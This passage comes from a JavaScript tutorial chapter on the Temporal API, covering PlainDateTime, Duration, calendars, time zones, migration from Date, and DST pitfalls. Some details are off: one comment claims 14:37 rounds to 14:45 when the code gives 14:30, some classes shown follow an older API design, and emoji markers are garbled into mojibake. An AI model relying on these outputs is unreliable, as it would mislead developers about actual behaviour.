         Temporal.PlainTime.compare(time, end) < 0;
}

const checkTime = Temporal.PlainTime.from('14:30');
console.log('During business hours?', isDuringBusinessHours(checkTime));

// Calculate work hours
function calculateWorkHours(clockIn, clockOut) {
  const duration = clockIn.until(clockOut, { largestUnit: 'hour' });
  return duration.hours + duration.minutes / 60;
}

const clockIn = Temporal.PlainTime.from('09:00');
const clockOut = Temporal.PlainTime.from('17:30');
console.log('Work hours:', calculateWorkHours(clockIn, clockOut)); // 8.5

// Round to nearest 15 minutes
function roundToQuarterHour(time) {
  const totalMinutes = time.hour * 60 + time.minute;
  const rounded = Math.round(totalMinutes / 15) * 15;
  const hours = Math.floor(rounded / 60);
  const minutes = rounded % 60;
  
  return Temporal.PlainTime.from({ hour: hours, minute: minutes });
}

const time = Temporal.PlainTime.from('14:37:00');
console.log('Rounded:', roundToQuarterHour(time).toString()); // "14:45:00"
```

---

## 20.5 Temporal.PlainDateTime

`Temporal.PlainDateTime` represents a date and time without timezone information.

### Date and Time (No Timezone)

PlainDateTime combines date and time but has no timezone awareness.

**Creating PlainDateTime:**

```javascript
// Current date and time
const now = Temporal.Now.plainDateTimeISO();
console.log(now.toString()); // "2024-02-10T14:30:45.123456789"

// From components
const dt1 = Temporal.PlainDateTime.from({
  year: 2024,
  month: 2,
  day: 10,
  hour: 14,
  minute: 30
});
console.log(dt1.toString()); // "2024-02-10T14:30:00"

// From ISO string
const dt2 = Temporal.PlainDateTime.from('2024-02-10T14:30:45');
console.log(dt2.toString());

// From date and time
const date = Temporal.PlainDate.from('2024-02-10');
const time = Temporal.PlainTime.from('14:30:00');
const dt3 = date.toPlainDateTime(time);
console.log(dt3.toString()); // "2024-02-10T14:30:00"
```

**Accessing Components:**

```javascript
const dt = Temporal.PlainDateTime.from('2024-02-10T14:30:45.123');

// Date components
console.log('Year:', dt.year);           // 2024
console.log('Month:', dt.month);         // 2
console.log('Day:', dt.day);             // 10
console.log('Day of week:', dt.dayOfWeek); // 6

// Time components
console.log('Hour:', dt.hour);           // 14
console.log('Minute:', dt.minute);       // 30
console.log('Second:', dt.second);       // 45
console.log('Millisecond:', dt.millisecond); // 123

// Extract date and time
const dateOnly = dt.toPlainDate();
console.log('Date only:', dateOnly.toString()); // "2024-02-10"

const timeOnly = dt.toPlainTime();
console.log('Time only:', timeOnly.toString()); // "14:30:45.123"
```

**DateTime Arithmetic:**

```javascript
const dt = Temporal.PlainDateTime.from('2024-02-10T14:30:00');

// Add duration
const later = dt.add({ days: 1, hours: 2, minutes: 30 });
console.log('Later:', later.toString()); // "2024-02-11T17:00:00"

// Subtract duration
const earlier = dt.subtract({ hours: 3 });
console.log('Earlier:', earlier.toString()); // "2024-02-10T11:30:00"

// Duration between datetimes
const dt1 = Temporal.PlainDateTime.from('2024-02-10T09:00:00');
const dt2 = Temporal.PlainDateTime.from('2024-02-12T17:30:00');

const duration = dt1.until(dt2);
console.log('Duration:', duration.toString()); // "P2DT8H30M"
console.log('Days:', duration.days);     // 2
console.log('Hours:', duration.hours);   // 8
console.log('Minutes:', duration.minutes); // 30

// Total hours
const totalHours = dt1.until(dt2, { largestUnit: 'hour' });
console.log('Total hours:', totalHours.hours); // 56
```

**Converting to ZonedDateTime:**

```javascript
const dt = Temporal.PlainDateTime.from('2024-02-10T14:30:00');

// Add timezone to create ZonedDateTime
const zdtNY = dt.toZonedDateTime('America/New_York');
console.log('New York:', zdtNY.toString());

const zdtTokyo = dt.toZonedDateTime('Asia/Tokyo');
console.log('Tokyo:', zdtTokyo.toString());

// Same wall-clock time, different instants
console.log('NY epoch:', zdtNY.epochMilliseconds);
console.log('Tokyo epoch:', zdtTokyo.epochMilliseconds);
console.log('Different instants:', 
  zdtNY.epochMilliseconds !== zdtTokyo.epochMilliseconds);
```

**Practical Examples:**

```javascript
// Meeting scheduler
function scheduleMeeting(startDateTime, durationHours) {
  const start = Temporal.PlainDateTime.from(startDateTime);
  const end = start.add({ hours: durationHours });
  
  return {
    start: start.toString(),
    end: end.toString(),
    duration: `${durationHours} hours`
  };
}

const meeting = scheduleMeeting('2024-02-10T14:00:00', 2);
console.log(meeting);
// { start: "2024-02-10T14:00:00", end: "2024-02-10T16:00:00", duration: "2 hours" }

// Event duration formatter
function formatEventDuration(start, end) {
  const startDT = Temporal.PlainDateTime.from(start);
  const endDT = Temporal.PlainDateTime.from(end);
  
  const duration = startDT.until(endDT);
  
  const parts = [];
  if (duration.days > 0) parts.push(`${duration.days} day(s)`);
  if (duration.hours > 0) parts.push(`${duration.hours} hour(s)`);
  if (duration.minutes > 0) parts.push(`${duration.minutes} minute(s)`);
  
  return parts.join(', ');
}

console.log(formatEventDuration(
  '2024-02-10T09:00:00',
  '2024-02-11T14:30:00'
));
// "1 day(s), 5 hour(s), 30 minute(s)"
```

---

## 20.6 Temporal.Duration

`Temporal.Duration` represents a length of time, independent of any starting point.

### Time Duration

Duration represents amounts of time like "2 hours and 30 minutes" or "3 days".

**Creating Durations:**

```javascript
// From object
const duration1 = Temporal.Duration.from({
  hours: 2,
  minutes: 30
});
console.log(duration1.toString()); // "PT2H30M"

const duration2 = Temporal.Duration.from({
  days: 3,
  hours: 4,
  minutes: 15,
  seconds: 30
});
console.log(duration2.toString()); // "P3DT4H15M30S"

// From ISO string
const duration3 = Temporal.Duration.from('PT2H30M');
console.log(duration3.toString());

const duration4 = Temporal.Duration.from('P1Y2M3DT4H5M6S');
console.log(duration4.toString());

// All units
const fullDuration = Temporal.Duration.from({
  years: 1,
  months: 2,
  weeks: 3,
  days: 4,
  hours: 5,
  minutes: 6,
  seconds: 7,
  milliseconds: 8,
  microseconds: 9,
  nanoseconds: 10
});
console.log(fullDuration.toString());
```

**Accessing Duration Components:**

```javascript
const duration = Temporal.Duration.from('P1Y2M3W4DT5H6M7.008009010S');

console.log('Years:', duration.years);             // 1
console.log('Months:', duration.months);           // 2
console.log('Weeks:', duration.weeks);             // 3
console.log('Days:', duration.days);               // 4
console.log('Hours:', duration.hours);             // 5
console.log('Minutes:', duration.minutes);         // 6
console.log('Seconds:', duration.seconds);         // 7
console.log('Milliseconds:', duration.milliseconds); // 8
console.log('Microseconds:', duration.microseconds); // 9
console.log('Nanoseconds:', duration.nanoseconds); // 10

// Sign
console.log('Sign:', duration.sign); // 1 (positive)

// Blank (zero duration)
const zeroDuration = Temporal.Duration.from('PT0S');
console.log('Blank:', zeroDuration.blank); // true
```

**Duration Arithmetic:**

```javascript
const duration1 = Temporal.Duration.from({ hours: 2, minutes: 30 });
const duration2 = Temporal.Duration.from({ hours: 1, minutes: 45 });

// Add durations
const sum = duration1.add(duration2);
console.log('Sum:', sum.toString()); // "PT4H15M"

// Subtract durations
const diff = duration1.subtract(duration2);
console.log('Difference:', diff.toString()); // "PT45M"

// Negate
const negative = duration1.negated();
console.log('Negated:', negative.toString()); // "-PT2H30M"

// Absolute value
const absolute = negative.abs();
console.log('Absolute:', absolute.toString()); // "PT2H30M"
```

**Duration Comparison:**

```javascript
const duration1 = Temporal.Duration.from({ hours: 2 });
const duration2 = Temporal.Duration.from({ minutes: 120 });
const duration3 = Temporal.Duration.from({ hours: 3 });

// Note: Durations with calendar units (years, months) cannot be compared
// without a reference point, because their lengths vary

// Compare time durations
console.log(Temporal.Duration.compare(duration1, duration2)); // 0 (equal)
console.log(Temporal.Duration.compare(duration1, duration3)); // -1

// Equality
console.log(duration1.equals(duration2)); // false (different representation)

// Same total time
console.log(duration1.total({ unit: 'minutes' }) === 
           duration2.total({ unit: 'minutes' })); // true
```

**Duration Balancing:**

```javascript
// Convert to larger units
const duration = Temporal.Duration.from({ minutes: 150 });

const balanced = duration.round({
  largestUnit: 'hour',
  smallestUnit: 'minute'
});
console.log(balanced.toString()); // "PT2H30M"

// Round to different units
const seconds = Temporal.Duration.from({ seconds: 90 });

const roundedToMinutes = seconds.round({ largestUnit: 'minute' });
console.log(roundedToMinutes.toString()); // "PT1M30S"

const roundedUp = seconds.round({ 
  largestUnit: 'minute',
  smallestUnit: 'minute',
  roundingMode: 'ceil'
});
console.log(roundedUp.toString()); // "PT2M"
```

**Total Time in Units:**

```javascript
const duration = Temporal.Duration.from({ hours: 2, minutes: 30 });

// Convert to total minutes
console.log('Total minutes:', duration.total({ unit: 'minute' })); // 150

// Convert to total seconds
console.log('Total seconds:', duration.total({ unit: 'second' })); // 9000

// Convert to total hours (fractional)
console.log('Total hours:', duration.total({ unit: 'hour' })); // 2.5

// With reference date for calendar units
const calendarDuration = Temporal.Duration.from({ months: 2 });
const referenceDate = Temporal.PlainDate.from('2024-01-01');

const totalDays = calendarDuration.total({ 
  unit: 'day',
  relativeTo: referenceDate
});
console.log('Total days:', totalDays); // 60 (Jan + Feb in 2024)
```

**Practical Examples:**

```javascript
// Format duration as human-readable
function formatDuration(duration) {
  const parts = [];
  
  if (duration.years) parts.push(`${duration.years} year(s)`);
  if (duration.months) parts.push(`${duration.months} month(s)`);
  if (duration.days) parts.push(`${duration.days} day(s)`);
  if (duration.hours) parts.push(`${duration.hours} hour(s)`);
  if (duration.minutes) parts.push(`${duration.minutes} minute(s)`);
  if (duration.seconds) parts.push(`${duration.seconds} second(s)`);
  
  return parts.join(', ') || '0 seconds';
}

const duration = Temporal.Duration.from('P1DT2H30M');
console.log(formatDuration(duration)); // "1 day(s), 2 hour(s), 30 minute(s)"

// Calculate project timeline
function calculateProjectEnd(startDate, estimatedHours) {
  const start = Temporal.PlainDate.from(startDate);
  const workHoursPerDay = 8;
  const days = Math.ceil(estimatedHours / workHoursPerDay);
  
  const duration = Temporal.Duration.from({ days });
  return start.add(duration).toString();
}

console.log(calculateProjectEnd('2024-02-10', 50)); // "2024-02-17"

// Timer/stopwatch
function formatElapsed(milliseconds) {
  const duration = Temporal.Duration.from({ milliseconds });
  const balanced = duration.round({ largestUnit: 'hour' });
  
  const hours = String(balanced.hours).padStart(2, '0');
  const minutes = String(balanced.minutes).padStart(2, '0');
  const seconds = String(balanced.seconds).padStart(2, '0');
  
  return `${hours}:${minutes}:${seconds}`;
}

console.log(formatElapsed(3665000)); // "01:01:05"
```

---

## 20.7 Temporal.Calendar

`Temporal.Calendar` handles different calendar systems beyond the ISO 8601 calendar.

### Calendar Systems

Temporal supports multiple calendar systems.

**Available Calendars:**

```javascript
// ISO 8601 calendar (default)
const isoCalendar = Temporal.Calendar.from('iso8601');
console.log(isoCalendar.id); // "iso8601"

// Other calendars
const hebrewCalendar = Temporal.Calendar.from('hebrew');
const islamicCalendar = Temporal.Calendar.from('islamic');
const chineseCalendar = Temporal.Calendar.from('chinese');
const japaneseCalendar = Temporal.Calendar.from('japanese');
const gregorianCalendar = Temporal.Calendar.from('gregory');

// List some supported calendars:
// iso8601, gregory, japanese, buddhist, chinese, coptic,
// dangi, ethioaa, ethiopic, hebrew, indian, islamic,
// islamic-umalqura, islamic-tbla, islamic-civil, islamic-rgsa,
// islamicc, persian, roc
```

**Using Different Calendars:**

```javascript
// Create date in ISO calendar
const isoDate = Temporal.PlainDate.from('2024-02-10');
console.log(isoDate.toString()); // "2024-02-10"
console.log(isoDate.calendarId); // "iso8601"

// Create date in Hebrew calendar
const hebrewDate = Temporal.PlainDate.from({
  year: 5784,
  monthCode: 'M05',
  day: 1,
  calendar: 'hebrew'
});
console.log(hebrewDate.toString()); // "5784-05-01[u-ca=hebrew]"

// Convert between calendars
const isoFromHebrew = hebrewDate.withCalendar('iso8601');
console.log(isoFromHebrew.toString()); // Corresponding ISO date
```

**Calendar-Specific Properties:**

```javascript
// Japanese calendar with eras
const japaneseDate = Temporal.PlainDate.from({
  year: 6, // Reiwa 6
  monthCode: 'M02',
  day: 10,
  calendar: 'japanese'
});

console.log(japaneseDate.toString()); // "0006-02-10[u-ca=japanese]"
console.log(japaneseDate.era); // "reiwa"
console.log(japaneseDate.eraYear); // 6

// Hebrew calendar
const hebrewDate = Temporal.PlainDate.from({
  year: 5784,
  monthCode: 'M05',
  day: 15,
  calendar: 'hebrew'
});

console.log('Hebrew year:', hebrewDate.year); // 5784
console.log('Month code:', hebrewDate.monthCode); // "M05"
console.log('Days in month:', hebrewDate.daysInMonth);
console.log('Months in year:', hebrewDate.monthsInYear);
```

**Calendar Arithmetic:**

```javascript
// Arithmetic respects calendar rules
const hebrewDate = Temporal.PlainDate.from({
  year: 5784,
  monthCode: 'M12',
  day: 29,
  calendar: 'hebrew'
});

// Add one month (Hebrew calendar rules apply)
const nextMonth = hebrewDate.add({ months: 1 });
console.log('Next month:', nextMonth.toString());

// Leap years in Hebrew calendar
const hebrewLeap = hebrewDate.with({ year: 5784 });
console.log('Is leap year:', hebrewLeap.inLeapYear);
console.log('Months in year:', hebrewLeap.monthsInYear); // 13 in leap year
```

**Custom Calendar:**

```javascript
// You can create custom calendars (advanced)
class FiscalYearCalendar extends Temporal.Calendar {
  constructor() {
    super('iso8601');
    this.id = 'fiscal-year';
  }
  
  // Fiscal year starts July 1
  year(date) {
    const isoDate = date.withCalendar('iso8601');
    if (isoDate.month >= 7) {
      return isoDate.year + 1;
    }
    return isoDate.year;
  }
  
  month(date) {
    const isoDate = date.withCalendar('iso8601');
    // Shift months: July = 1, August = 2, ..., June = 12
    return ((isoDate.month - 7 + 12) % 12) + 1;
  }
}

// Note: Full custom calendar implementation is complex
// This is a simplified example
```

---

## 20.8 Temporal.TimeZone

`Temporal.TimeZone` handles timezone operations and conversions.

### Timezone Handling

TimeZone provides timezone-aware date/time operations.

**Creating TimeZones:**

```javascript
// From IANA timezone ID
const nyTZ = Temporal.TimeZone.from('America/New_York');
console.log(nyTZ.id); // "America/New_York"

const tokyoTZ = Temporal.TimeZone.from('Asia/Tokyo');
console.log(tokyoTZ.id); // "Asia/Tokyo"

// UTC
const utcTZ = Temporal.TimeZone.from('UTC');
console.log(utcTZ.id); // "UTC"

// From offset string
const offsetTZ = Temporal.TimeZone.from('-05:00');
console.log(offsetTZ.id); // "-05:00"
```

**Getting Offset:**

```javascript
const nyTZ = Temporal.TimeZone.from('America/New_York');

// Get offset for specific instant
const instant = Temporal.Instant.from('2024-02-10T19:30:00Z');
const offset = nyTZ.getOffsetStringFor(instant);
console.log('Offset:', offset); // "-05:00"

// Get offset nanoseconds
const offsetNs = nyTZ.getOffsetNanosecondsFor(instant);
console.log('Offset ns:', offsetNs); // -18000000000000

// Different seasons have different offsets (DST)
const summer = Temporal.Instant.from('2024-07-10T19:30:00Z');
const summerOffset = nyTZ.getOffsetStringFor(summer);
console.log('Summer offset:', summerOffset); // "-04:00" (DST)
```

**Converting to Local Time:**

```javascript
const instant = Temporal.Instant.from('2024-02-10T19:30:00Z');

// Convert to different timezones
const nyTZ = Temporal.TimeZone.from('America/New_York');
const nyTime = instant.toZonedDateTimeISO(nyTZ);
console.log('New York:', nyTime.toString());
// "2024-02-10T14:30:00-05:00[America/New_York]"

const tokyoTZ = Temporal.TimeZone.from('Asia/Tokyo');
const tokyoTime = instant.toZonedDateTimeISO(tokyoTZ);
console.log('Tokyo:', tokyoTime.toString());
// "2024-02-11T04:30:00+09:00[Asia/Tokyo]"

const londonTZ = Temporal.TimeZone.from('Europe/London');
const londonTime = instant.toZonedDateTimeISO(londonTZ);
console.log('London:', londonTime.toString());
// "2024-02-10T19:30:00+00:00[Europe/London]"
```

**Timezone Transitions (DST):**

```javascript
const nyTZ = Temporal.TimeZone.from('America/New_York');

// Find DST transitions
const transitions = nyTZ.getNextTransition(
  Temporal.Instant.from('2024-01-01T00:00:00Z')
);
console.log('Next transition:', transitions?.toString());

// Get all transitions in a year
function getDSTTransitions(timeZone, year) {
  const tz = Temporal.TimeZone.from(timeZone);
  const yearStart = Temporal.Instant.from(`${year}-01-01T00:00:00Z`);
  const yearEnd = Temporal.Instant.from(`${year + 1}-01-01T00:00:00Z`);
  
  const transitions = [];
  let current = yearStart;
  
  while (current && Temporal.Instant.compare(current, yearEnd) < 0) {
    const next = tz.getNextTransition(current);
    if (!next || Temporal.Instant.compare(next, yearEnd) >= 0) break;
    transitions.push(next);
    current = next;
  }
  
  return transitions;
}

const nyTransitions = getDSTTransitions('America/New_York', 2024);
console.log('2024 DST transitions in NY:');
nyTransitions.forEach(t => {
  const zdt = t.toZonedDateTimeISO('America/New_York');
  console.log(zdt.toString());
});
```

**Possible Instant Disambiguation:**

```javascript
const nyTZ = Temporal.TimeZone.from('America/New_York');

// During DST transition, some times don't exist or occur twice
const plainDT = Temporal.PlainDateTime.from('2024-03-10T02:30:00');

// This time doesn't exist (DST spring forward)
// 2:00 AM â†’ 3:00 AM

// Compatible (default): choose later time
const compatible = nyTZ.getInstantFor(plainDT, { disambiguation: 'compatible' });
console.log('Compatible:', compatible.toZonedDateTimeISO(nyTZ).toString());
// "2024-03-10T03:30:00-04:00[America/New_York]"

// Earlier: choose earlier time
const earlier = nyTZ.getInstantFor(plainDT, { disambiguation: 'earlier' });
console.log('Earlier:', earlier.toZonedDateTimeISO(nyTZ).toString());

// Later: choose later time
const later = nyTZ.getInstantFor(plainDT, { disambiguation: 'later' });
console.log('Later:', later.toZonedDateTimeISO(nyTZ).toString());

// Reject: throw error
try {
  nyTZ.getInstantFor(plainDT, { disambiguation: 'reject' });
} catch (e) {
  console.log('Rejected:', e.message);
}
```

**Getting Possible Instants:**

```javascript
const nyTZ = Temporal.TimeZone.from('America/New_York');

// Normal time (one possibility)
const normalDT = Temporal.PlainDateTime.from('2024-02-10T14:30:00');
const normalInstants = nyTZ.getPossibleInstantsFor(normalDT);
console.log('Normal time instants:', normalInstants.length); // 1

// During DST gap (no possibilities)
const gapDT = Temporal.PlainDateTime.from('2024-03-10T02:30:00');
const gapInstants = nyTZ.getPossibleInstantsFor(gapDT);
console.log('Gap time instants:', gapInstants.length); // 0

// During DST overlap (two possibilities)
const overlapDT = Temporal.PlainDateTime.from('2024-11-03T01:30:00');
const overlapInstants = nyTZ.getPossibleInstantsFor(overlapDT);
console.log('Overlap time instants:', overlapInstants.length); // 2

if (overlapInstants.length === 2) {
  console.log('First occurrence:', 
    overlapInstants[0].toZonedDateTimeISO(nyTZ).toString());
  console.log('Second occurrence:', 
    overlapInstants[1].toZonedDateTimeISO(nyTZ).toString());
}
```

**Practical Examples:**

```javascript
// Meeting across timezones
function scheduleCrossTZMeeting(localTime, localTZ, remoteTZ) {
  const local = Temporal.PlainDateTime.from(localTime);
  const localZoned = local.toZonedDateTime(localTZ);
  const remoteZoned = localZoned.withTimeZone(remoteTZ);
  
  return {
    local: localZoned.toString(),
    remote: remoteZoned.toString(),
    localTime: localZoned.toPlainTime().toString(),
    remoteTime: remoteZoned.toPlainTime().toString()
  };
}

const meeting = scheduleCrossTZMeeting(
  '2024-02-10T14:00:00',
  'America/New_York',
  'Asia/Tokyo'
);
console.log('Meeting times:', meeting);

// Find business hours overlap
function findOverlap(tz1, tz2, startHour = 9, endHour = 17) {
  const now = Temporal.Now.instant();
  const zdt1 = now.toZonedDateTimeISO(tz1);
  const zdt2 = now.toZonedDateTimeISO(tz2);
  
  // Create business hours in each timezone
  const start1 = zdt1.with({ hour: startHour, minute: 0 });
  const end1 = zdt1.with({ hour: endHour, minute: 0 });
  
  const start2 = zdt2.with({ hour: startHour, minute: 0 });
  const end2 = zdt2.with({ hour: endHour, minute: 0 });
  
  // Convert to same timezone for comparison
  const start2InTZ1 = start2.withTimeZone(tz1);
  const end2InTZ1 = end2.withTimeZone(tz1);
  
  // Find overlap
  const overlapStart = Temporal.ZonedDateTime.compare(start1, start2InTZ1) > 0
    ? start1 : start2InTZ1;
  const overlapEnd = Temporal.ZonedDateTime.compare(end1, end2InTZ1) < 0
    ? end1 : end2InTZ1;
  
  if (Temporal.ZonedDateTime.compare(overlapStart, overlapEnd) < 0) {
    return {
      start: overlapStart.toString(),
      end: overlapEnd.toString(),
      duration: overlapStart.until(overlapEnd).toString()
    };
  }
  
  return null; // No overlap
}

const overlap = findOverlap('America/New_York', 'Asia/Tokyo');
console.log('Business hours overlap:', overlap);
```

---

## 20.9 Migrating from Date to Temporal

### Common Migration Patterns

```javascript
// === CREATING DATES ===

// âŒ OLD: new Date()
const now = new Date();

// âœ… NEW: Temporal equivalents
const instant = Temporal.Now.instant();           // Absolute time (like Date)
const zdt = Temporal.Now.zonedDateTimeISO();       // With timezone
const plainDate = Temporal.Now.plainDateISO();     // Just the date
const plainTime = Temporal.Now.plainTimeISO();     // Just the time


// === PARSING ISO STRINGS ===

// âŒ OLD: Parse ISO string
const date1 = new Date('2024-06-15T10:30:00Z');

// âœ… NEW: Parse ISO string
const instant1 = Temporal.Instant.from('2024-06-15T10:30:00Z');
const zdt1 = Temporal.ZonedDateTime.from('2024-06-15T10:30:00Z[UTC]');


// === CREATING SPECIFIC DATES ===

// âŒ OLD: Month is 0-indexed!
const date2 = new Date(2024, 5, 15);  // June 15 (5 = June)

// âœ… NEW: Month is 1-indexed
const plain = Temporal.PlainDate.from({ year: 2024, month: 6, day: 15 });


// === GETTING COMPONENTS ===

// âŒ OLD
const d = new Date('2024-06-15T10:30:00');
const year = d.getFullYear();    // 2024
const month = d.getMonth() + 1;  // 6 (had to add 1!)
const day = d.getDate();         // 15
const hour = d.getHours();       // 10

// âœ… NEW
const pd = Temporal.PlainDateTime.from('2024-06-15T10:30:00');
const year2 = pd.year;   // 2024
const month2 = pd.month; // 6 (no adjustment needed)
const day2 = pd.day;     // 15
const hour2 = pd.hour;   // 10


// === DATE ARITHMETIC ===

// âŒ OLD: Manual calculation, error-prone
const date3 = new Date('2024-06-15');
date3.setDate(date3.getDate() + 30);  // Mutates! Also wrong for months

// âœ… NEW: Clear, immutable
const pd2 = Temporal.PlainDate.from('2024-06-15');
const later = pd2.add({ days: 30 });  // Returns new PlainDate


// === COMPARING DATES ===

// âŒ OLD: Convert to numbers
const d1 = new Date('2024-06-15');
const d2 = new Date('2024-07-01');
const isEarlier = d1.getTime() < d2.getTime();

// âœ… NEW: Built-in comparison
const pd3 = Temporal.PlainDate.from('2024-06-15');
const pd4 = Temporal.PlainDate.from('2024-07-01');
const cmp = Temporal.PlainDate.compare(pd3, pd4);  // -1, 0, or 1


// === TIME DIFFERENCE ===

// âŒ OLD: Manual millisecond math
const start = new Date('2024-01-01');
const end = new Date('2024-06-15');
const diffMs = end - start;
const diffDays = diffMs / (1000 * 60 * 60 * 24);  // Error-prone

// âœ… NEW: Duration objects
const s = Temporal.PlainDate.from('2024-01-01');
const e = Temporal.PlainDate.from('2024-06-15');
const duration = s.until(e);
console.log(duration.days);  // 166


// === FORMATTING ===

// âŒ OLD: toLocaleString or manual formatting
const date4 = new Date('2024-06-15T10:30:00');
const formatted = date4.toLocaleString('en-US', { 
  dateStyle: 'long', 
  timeStyle: 'short' 
});

// âœ… NEW: Same Intl support, but with consistent types
const pdt = Temporal.PlainDateTime.from('2024-06-15T10:30:00');
const fmt = pdt.toLocaleString('en-US', { 
  dateStyle: 'long', 
  timeStyle: 'short' 
});
```

### Converting Between Date and Temporal

```javascript
// Date â†’ Temporal
const date = new Date();

// To Instant
const instant = Temporal.Instant.fromEpochMilliseconds(date.getTime());

// To ZonedDateTime (in specific timezone)
const zdt = instant.toZonedDateTimeISO('America/New_York');

// To PlainDateTime (loses timezone)
const pdt = zdt.toPlainDateTime();


// Temporal â†’ Date
const instant2 = Temporal.Now.instant();
const date2 = new Date(instant2.epochMilliseconds);

// Or from ZonedDateTime
const zdt2 = Temporal.Now.zonedDateTimeISO('America/New_York');
const date3 = new Date(zdt2.epochMilliseconds);
```

---

## 20.10 Duration Deep Dive

### Understanding Duration Components

```javascript
// Duration has these components (in order):
// years, months, weeks, days, hours, minutes, seconds, milliseconds, microseconds, nanoseconds

const duration = Temporal.Duration.from({
  years: 1,
  months: 2,
  weeks: 3,
  days: 4,
  hours: 5,
  minutes: 6,
  seconds: 7,
  milliseconds: 8,
  microseconds: 9,
  nanoseconds: 10
});

console.log(duration.toString());
// P1Y2M3W4DT5H6M7.008009010S

// ISO 8601 Duration format:
// P = period start
// 1Y = 1 year
// 2M = 2 months
// 3W = 3 weeks
// 4D = 4 days
// T = time start
// 5H = 5 hours
// 6M = 6 minutes
// 7.008009010S = 7 seconds and fractional
```

### Duration Balancing

```javascript
// By default, Duration doesn't balance
const d1 = Temporal.Duration.from({ hours: 36 });
console.log(d1.hours);  // 36 (not converted to days)

// Balancing converts to larger units
const d2 = d1.round({ largestUnit: 'days' });
console.log(d2.days, d2.hours);  // 1 day, 12 hours

// Complex balancing example
const duration = Temporal.Duration.from({
  seconds: 90061  // 25 hours, 1 minute, 1 second
});

const balanced = duration.round({
  largestUnit: 'days',
  smallestUnit: 'seconds'
});
console.log(balanced.toString());  // P1DT1H1M1S
```

### Duration Arithmetic

```javascript
// Add durations
const d1 = Temporal.Duration.from({ hours: 5, minutes: 30 });
const d2 = Temporal.Duration.from({ hours: 2, minutes: 45 });
const sum = d1.add(d2);
console.log(sum.toString());  // PT8H15M (unbalanced!)

// Subtract durations
const diff = d1.subtract(d2);
console.log(diff.toString());  // PT2H45M

// Negate duration
const neg = d1.negated();
console.log(neg.toString());  // -PT5H30M

// Absolute value
const abs = neg.abs();
console.log(abs.toString());  // PT5H30M
```

### Duration with Relative Context

```javascript
// Months/years need a reference date (they vary in length!)
const duration = Temporal.Duration.from({ months: 1 });

const jan1 = Temporal.PlainDate.from('2024-01-01');
const feb1 = Temporal.PlainDate.from('2024-02-01');

// January has 31 days, February has 29 (2024 is leap year)
const janDays = jan1.until(jan1.add(duration), { largestUnit: 'days' });
const febDays = feb1.until(feb1.add(duration), { largestUnit: 'days' });

console.log(janDays.days);  // 31
console.log(febDays.days);  // 29

// This is why duration.total() needs relativeTo:
const totalDays = duration.total({
  unit: 'days',
  relativeTo: jan1
});
console.log(totalDays);  // 31
```

### Common Duration Patterns

```javascript
// 1. Human-readable duration
function formatDuration(duration) {
  const parts = [];
  if (duration.years) parts.push(`${duration.years}y`);
  if (duration.months) parts.push(`${duration.months}mo`);
  if (duration.days) parts.push(`${duration.days}d`);
  if (duration.hours) parts.push(`${duration.hours}h`);
  if (duration.minutes) parts.push(`${duration.minutes}m`);
  if (duration.seconds) parts.push(`${duration.seconds}s`);
  return parts.join(' ') || '0s';
}

const d = Temporal.Duration.from({ hours: 2, minutes: 30 });
console.log(formatDuration(d));  // "2h 30m"


// 2. Age calculation
function getAge(birthDate) {
  const today = Temporal.Now.plainDateISO();
  const birth = Temporal.PlainDate.from(birthDate);
  return birth.until(today, { largestUnit: 'years' });
}

const age = getAge('1990-05-15');
console.log(`${age.years} years, ${age.months} months, ${age.days} days`);


// 3. Time until event
function timeUntil(eventDateTime) {
  const now = Temporal.Now.zonedDateTimeISO();
  const event = Temporal.ZonedDateTime.from(eventDateTime);
  return now.until(event, { largestUnit: 'days' });
}

const countdown = timeUntil('2024-12-31T23:59:59[America/New_York]');
console.log(formatDuration(countdown));


// 4. Business hours calculation
function businessHoursBetween(start, end) {
  let current = start;
  let totalHours = 0;
  
  while (Temporal.PlainDateTime.compare(current, end) < 0) {
    // Skip weekends
    if (current.dayOfWeek <= 5) {  // Mon-Fri
      // Count hours between 9-17
      const dayStart = current.with({ hour: 9, minute: 0 });
      const dayEnd = current.with({ hour: 17, minute: 0 });
      
      const effectiveStart = Temporal.PlainDateTime.compare(current, dayStart) > 0 
        ? current : dayStart;
      const effectiveEnd = Temporal.PlainDateTime.compare(end, dayEnd) < 0 
        ? end : dayEnd;
      
      if (Temporal.PlainDateTime.compare(effectiveStart, effectiveEnd) < 0) {
        const hours = effectiveStart.until(effectiveEnd, { largestUnit: 'hours' });
        totalHours += hours.hours + hours.minutes / 60;
      }
    }
    
    current = current.add({ days: 1 }).with({ hour: 0, minute: 0 });
  }
  
  return totalHours;
}
```

---

## 20.11 Timezone Gotchas

### DST Transitions

```javascript
// DST "spring forward" - hour doesn't exist
try {
  // 2:30 AM doesn't exist on March 10, 2024 (US DST)
  const impossible = Temporal.ZonedDateTime.from(
    '2024-03-10T02:30[America/New_York]',
    { offset: 'reject' }  // Strict mode
  );
} catch (e) {
  console.log('Time does not exist!');
}

// Default behavior: adjust to valid time
const adjusted = Temporal.ZonedDateTime.from('2024-03-10T02:30[America/New_York]');
console.log(adjusted.toString());  // 2024-03-10T03:30:00-04:00 (moved forward)


// DST "fall back" - hour exists twice
// 1:30 AM happens twice on November 3, 2024
const ambiguous1 = Temporal.ZonedDateTime.from({
  year: 2024, month: 11, day: 3,
  hour: 1, minute: 30,
  timeZone: 'America/New_York',
  offset: '-04:00'  // First 1:30 (before fall back)
});

const ambiguous2 = Temporal.ZonedDateTime.from({
  year: 2024, month: 11, day: 3,
  hour: 1, minute: 30,
  timeZone: 'America/New_York',
  offset: '-05:00'  // Second 1:30 (after fall back)
});

console.log(ambiguous1.epochMilliseconds !== ambiguous2.epochMilliseconds);  // true!
```

### Duration Across DST

```javascript
// Adding hours vs adding days across DST
const beforeDST = Temporal.ZonedDateTime.from('2024-03-10T01:00[America/New_York]');

// Add 24 hours - actual elapsed time
const plus24h = beforeDST.add({ hours: 24 });
console.log(plus24h.toString());  // 2024-03-11T02:00 (clock shows 2AM)

// Add 1 day - same wall clock time
const plus1d = beforeDST.add({ days: 1 });
console.log(plus1d.toString());   // 2024-03-11T01:00 (clock shows 1AM)

// Different results! March 10 only has 23 hours
```

### Common Timezone Mistakes

```javascript
// âŒ WRONG: Assuming all days have 24 hours
function addDayBad(date) {
  return date.add({ hours: 24 });  // Wrong on DST days!
}

// âœ… CORRECT: Use calendar days
function addDayGood(date) {
  return date.add({ days: 1 });  // Correct!
}


// âŒ WRONG: Comparing ZonedDateTime directly
const tokyo = Temporal.ZonedDateTime.from('2024-06-15T15:00[Asia/Tokyo]');
const ny = Temporal.ZonedDateTime.from('2024-06-15T02:00[America/New_York]');
